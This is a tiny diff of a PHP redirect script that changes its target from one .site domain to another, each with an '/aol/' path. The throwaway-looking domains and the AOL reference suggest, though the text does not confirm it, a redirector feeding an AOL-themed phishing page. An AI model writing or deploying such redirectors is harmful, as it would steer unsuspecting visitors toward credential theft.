@@ -1,4 +1,4 @@
 <?php
-header("Location: https://start-your-product.site/aol/");
+header("Location: https://my-dashboard-online.site/aol/");
 die();
 ?>
